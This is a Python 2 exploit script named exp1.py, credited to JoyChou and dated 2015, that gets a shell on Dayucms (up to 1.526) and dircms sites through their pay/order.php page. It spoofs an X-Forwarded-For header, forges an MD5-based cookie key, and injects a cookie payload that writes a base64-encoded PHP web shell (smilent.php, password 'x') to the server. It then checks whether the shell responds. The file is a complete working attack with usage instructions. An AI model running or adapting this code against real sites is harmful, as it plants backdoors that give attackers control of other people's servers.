#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Filename: exp1.py
#coding:utf-8

import requests
import sys
import hashlib
import urllib

__Author__ = 'JoyChou'
__Date__ = '2015年5月27日 19:13:48'


def is_url_getshell(url):
    order = url[-13:]
    if order != 'pay/order.php':
        print 'The url can not getshell...'
        sys.exit()

def printinfo():
    print '''
    #######################################################
    #                                                     #
    #       Dayucms or dircms Getshell EXP                #
    #       Version: dayucms <= 1.526 and all dircms      #
    #       Blog: www.joychou.org                         #
    #                                                     #
    #######################################################
   
    Usage:   exp.py url 
    Example: exp.py http://www.dayucms.com/pay/order.php

    '''
def md5(str):
    return hashlib.md5(str).hexdigest()

def dayucms_md5(str):
    return md5(str)[8:24]

# param:  http://victim.com/upload/test.php
# return: http://victim.com/upload/
def spilit_url(url):
    m = 0
    for i in url[::-1]: #reverse url
        m+=1
        if i == '/':
            break
    url_spilit = url[:-(m-1)]
    return url_spilit

def main(url):
    ip = '2.2.2.2'
    try:
        r = requests.get(url)
    except Exception, e:
        print e
        sys.exit()
    cookie = r.cookies
    # get cookie_pre from cookie of client request
    for cookie_tuple in cookie.items(): # cookie.items() return a tuple
        for key in cookie_tuple:
            if 'siteid' in key:
                cookie_pre = key
                break;
    cookiekey = dayucms_md5('productarray'+ip)
    cookiekey = cookie_pre[:-6] + cookiekey

    print 'X-Forwarded-For is: %s' % ip
    print 'cookiekey which need to add is: %s' % cookiekey
    print ''
    false_headers = {'X-Forwarded-For': ip}

    #   %3b is the urlencode of ;
    #   ; must be replaced by $3b.  because in cookies, ; means that one cookie is over
    #   shell password is x
    shell = '1%3bfputs(fopen(base64_decode(c21pbGVudC5waHA),w),base64_decode(PD9waHAKYXNzZXJ0KAokX1BPU1RbeF0KKTsKPz4))'
    false_cookies = {cookiekey: shell, cookie_pre: '1'}
    r = requests.get(url, cookies = false_cookies, headers = false_headers)

    url_shell = spilit_url(url) + 'smilent.php'
    r = requests.get(url_shell)
    if r.status_code == 200:
        print 'getshell success!'
        print 'shell url is %s' % url_shell
    else:
        print 'getshell fail...'


if __name__ == '__main__':
    printinfo()
    if len(sys.argv) != 2:
        print 'input error'
        sys.exit()

    is_url_getshell(sys.argv[1])

    main(sys.argv[1])
